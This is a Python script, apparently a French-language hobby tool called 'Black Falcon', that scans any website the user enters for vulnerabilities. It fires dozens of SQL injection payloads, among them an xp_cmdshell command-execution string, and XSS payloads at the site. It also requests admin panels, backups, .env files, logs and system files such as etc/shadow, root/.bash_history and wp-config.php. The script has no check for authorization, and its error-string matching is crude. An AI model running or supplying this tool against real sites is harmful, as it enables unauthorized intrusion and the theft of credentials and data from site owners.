import requests
from colorama import Fore, Style, init
import time

init(autoreset=True)

def banner():
    print(f"{Fore.RED}=== Website Vulnerability Scanner Black Falcon ==={Style.RESET_ALL}")

def get_user_agent():
    return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

def check_paths(url, paths, vuln_name, headers):
    if not url.endswith("/"):
        url += "/"
    found = False
    for path in paths:
        try:
            resp = requests.get(url + path, timeout=10, headers=headers)
            if resp.status_code == 200:
                found = True
                print(f"{Fore.BLUE}[{time.strftime('%H:%M:%S')}] {Fore.RED}{vuln_name} : {Fore.BLUE}Trouvé -> /{path}{Style.RESET_ALL}")
        except Exception as e:
            continue
    if not found:
        print(f"{Fore.BLUE}[{time.strftime('%H:%M:%S')}] {Fore.RED}{vuln_name} : {Fore.BLUE}Aucun résultat{Style.RESET_ALL}")

def test_payloads(url, payloads, indicators, vuln_name, headers):
    if not url.endswith("/"):
        url += "/"
    found = False
    try:
        resp_old = requests.get(url, timeout=10, headers=headers)
        for payload in payloads:
            try:
                resp = requests.get(url + payload, timeout=10, headers=headers)
                if resp.status_code == 200 and resp.text.lower() != resp_old.text.lower():
                    for indicator in indicators:
                        if indicator.lower() in resp.text.lower():
                            found = True
                            print(f"{Fore.BLUE}[{time.strftime('%H:%M:%S')}] {Fore.RED}{vuln_name} : {Fore.BLUE}Vulnérabilité détectée ! Payload : {payload} | Indicateur : {indicator}{Style.RESET_ALL}")
                            break
            except Exception:
                continue
    except Exception:
        pass
    if not found:
        print(f"{Fore.BLUE}[{time.strftime('%H:%M:%S')}] {Fore.RED}{vuln_name} : {Fore.BLUE}Aucune vulnérabilité détectée{Style.RESET_ALL}")

def main():
    banner()
    user_agent = get_user_agent()
    headers = {"User-Agent": user_agent}
    print(f"{Fore.BLUE}User-Agent sélectionné : {Fore.RED}{user_agent}{Style.RESET_ALL}")
    website_url = input(f"{Fore.BLUE}Website Url -> {Style.RESET_ALL}").strip()
    if not website_url.startswith("http"):
        website_url = "https://" + website_url

    print(f"{Fore.BLUE}[{time.strftime('%H:%M:%S')}] {Fore.RED}Recherche de vulnérabilités...{Style.RESET_ALL}")

    # SQLi
    sql_payloads = [
        "'", '"', "''", "' OR '1'='1'", "' OR '1'='1' --", "' OR '1'='1' /*", "' OR 1=1 --", "/1000",
        "' OR 1=1 /*", "' OR 'a'='a", "' OR 'a'='a' --", "' OR 'a'='a' /*", "' OR ''='", "admin'--", "admin' /*",
        "' OR 1=1#", "' OR '1'='1' (", "') OR ('1'='1", "'; EXEC xp_cmdshell('dir'); --", "' UNION SELECT NULL, NULL, NULL --", 
        "' OR 1=1 --", "' OR '1'='1' --", "' OR '1'='1' #", "' OR '1'='1'/*", "' OR '1'='1'--", "' OR 1=1#", "' OR 1=1/*", 
        "' OR 'a'='a'#", "' OR 'a'='a'/*", "' OR ''=''", "' OR '1'='1'--", "admin' --", "admin' #", "' OR 1=1--", "' OR 1=1/*", 
        "' OR 'a'='a'--", "' OR ''=''", "' OR 'x'='x'", "' OR 'x'='x'--", "' OR 'x'='x'/*", "' OR 1=1#", "' OR 1=1--", 
        "' OR 1=1/*", "' OR '1'='1'/*", "' OR '1'='1'--", "' OR '1'='1'#", "' OR '1'='1'/*"
    ]
    sql_indicators = [
        "SQL syntax", "SQL error", "MySQL", "mysql", "MySQLYou",
        "Unclosed quotation mark", "SQLSTATE", "syntax error", "ORA-", 
        "SQLite", "PostgreSQL", "Truncated incorrect", "Division by zero",
        "You have an error in your SQL syntax", "Incorrect syntax near", 
        "SQL command not properly ended", "sql", "Sql", "Warning", "Error"
    ]
    test_payloads(website_url, sql_payloads, sql_indicators, "SQL Injection", headers)

    # XSS
    xss_payloads = [
        "<script>alert('XssFoundByBlackFalcon')</script>",
        "<img src=x onerror=alert('XssFoundByBlackFalcon')>",
        "<svg/onload=alert('XssFoundByBlackFalcon')>"
    ]
    xss_indicators = ["<script>", "alert(", "onerror=", "<svg", "javascript:"]
    test_payloads(website_url, xss_payloads, xss_indicators, "XSS", headers)

    # Paths intéressants
    interesting_paths = [
        "admin", "admin/", "admin/index.php", "admin/login.php", "admin/config.php",
        "backup", "backup/", "backup/db.sql", "backup/config.tar.gz", "backup/backup.sql",
        "private", "private/", "private/.env", "private/config.php", "private/secret.txt",
        "uploads", "uploads/", "uploads/file.txt", "uploads/image.jpg", "uploads/backup.zip",
        "api", "api/", "api/v1/", "api/v1/users", "api/v1/status",
        "logs", "logs/", "logs/error.log", "logs/access.log", "logs/debug.log",
        "cache", "cache/", "cache/temp/", "cache/session/", "cache/data/",
        "server-status", "server-status/", "server-status/index.html",
        "dashboard", "dashboard/", "dashboard/index.html", "dashboard/admin.php", "dashboard/settings.php"
    ]
    check_paths(website_url, interesting_paths, "Chemins sensibles", headers)

    # Fichiers sensibles
    sensitive_files = [
        "etc/passwd", "etc/password", "etc/shadow", "etc/group", "etc/hosts", "etc/hostname",
        "var/log/auth.log", "var/log/syslog", "var/log/messages", "var/log/nginx/access.log",
        "root/.bash_history", "home/user/.bash_history", "www/html/wp-config.php", "proc/self/environ",
        "opt/lampp/phpmyadmin/config.inc.php", "boot/grub/menu.lst", "proc/net/tcp"
    ]
    check_paths(website_url, sensitive_files, "Fichiers sensibles", headers)

    print(f"{Fore.RED}Scan terminé.{Style.RESET_ALL}")
    input(f"{Fore.RED}Appuyez sur Entrée pour quitter.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()